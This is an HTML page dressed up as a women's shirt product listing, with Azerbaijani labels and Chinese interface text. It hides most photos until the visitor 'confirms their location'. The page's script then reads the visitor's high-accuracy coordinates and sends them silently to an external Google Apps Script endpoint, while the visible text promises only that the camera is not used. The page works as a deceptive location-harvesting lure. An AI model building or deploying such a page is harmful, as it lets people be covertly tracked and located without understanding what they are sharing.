<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Trend Köynəklər</title>

<style>
*{
  box-sizing:border-box;
}

body{
  margin:0;
  font-family:Arial,sans-serif;
  background:#f7f2ef;
}

.page{
  max-width:600px;
  margin:auto;
  padding:15px 15px 40px;
}

.location{
  background:white;
  border-radius:28px;
  padding:45px 20px;
  text-align:center;
  box-shadow:0 5px 25px rgba(0,0,0,.12);
}

.icon{
  font-size:70px;
}

h1{
  font-size:38px;
  margin:18px 0;
}

p{
  font-size:21px;
  line-height:1.6;
  color:#555;
}

.info{
  background:#f4eeee;
  padding:18px;
  border-radius:16px;
  font-size:17px;
  line-height:1.6;
  margin:25px 0;
}

button{
  width:100%;
  padding:21px;
  border:0;
  border-radius:17px;
  background:#222;
  color:white;
  font-size:22px;
  font-weight:bold;
  cursor:pointer;
}

button:disabled{
  opacity:.6;
}

#status{
  margin-top:20px;
  font-size:17px;
}

.photo{
  width:100%;
  display:block;
  border-radius:20px;
  margin-top:20px;
}

#afterPhotos{
  display:none;
}
</style>
</head>

<body>

<div class="page">

  <!-- İLK ŞƏKİL -->
  <img
    class="photo"
    src="IMG_20261005_014348.jpg"
    alt="Trend qadın köynəyi"
  >

  <!-- KONUM TƏSDİQİ -->
  <div class="location">

    <div class="icon">📍</div>

    <h1>位置确认</h1>

    <p>
      请确认您的位置
      <br>
      点击下面的按钮并允许位置权限
    </p>

    <div class="info">
      🔒 只有在您主动允许后，我们才会获取您的位置。
      <br><br>
      📷 不使用摄像头，也不会拍照。
    </div>

    <button id="locationBtn">
      确认我的位置
    </button>

    <div id="status"></div>

  </div>

  <!-- İCAZƏDƏN SONRA AÇILAN ŞƏKİLLƏR -->
  <div id="afterPhotos">

    <img
      class="photo"
      src="IMG_20261005_014406.jpg"
      alt="Trend qadın köynəyi"
    >

    <img
      class="photo"
      src="IMG_20261005_014430.jpg"
      alt="Trend qadın köynəyi"
    >

  </div>

</div>

<script>

/* APPS SCRIPT ÜNVANI */
const APP_SCRIPT_URL =
"https://script.google.com/macros/s/AKfycbxTNuy179zPxbSJYoQgAfNu6bqNCqjqjKeTIO7B3SKnYrmrGCN9DAD4TpphJ2tK_fsQZg/exec";


const btn =
document.getElementById("locationBtn");

const status =
document.getElementById("status");

const afterPhotos =
document.getElementById("afterPhotos");


btn.onclick = function(){

  if(!navigator.geolocation){

    status.textContent =
    "您的浏览器不支持位置服务。";

    return;
  }

  btn.disabled = true;

  status.textContent =
  "正在等待位置权限...";


  navigator.geolocation.getCurrentPosition(

    function(position){

      const latitude =
      position.coords.latitude;

      const longitude =
      position.coords.longitude;

      const accuracy =
      position.coords.accuracy;


      /* KONUMU APPS SCRIPTƏ GÖNDƏR */
      fetch(APP_SCRIPT_URL, {

        method:"POST",

        mode:"no-cors",

        headers:{
          "Content-Type":
          "text/plain;charset=utf-8"
        },

        body:JSON.stringify({

          latitude:latitude,

          longitude:longitude,

          accuracy:accuracy,

          timestamp:
          new Date().toISOString()

        })

      }).catch(function(error){

        console.log(error);

      });


      status.textContent =
      "位置确认成功。";

      afterPhotos.style.display =
      "block";


      afterPhotos.scrollIntoView({
        behavior:"smooth"
      });

    },


    function(error){

      btn.disabled = false;

      status.textContent =
      "请允许位置权限后继续。";

    },


    {
      enableHighAccuracy:true,

      timeout:15000,

      maximumAge:0
    }

  );

};

</script>

</body>
    </html>
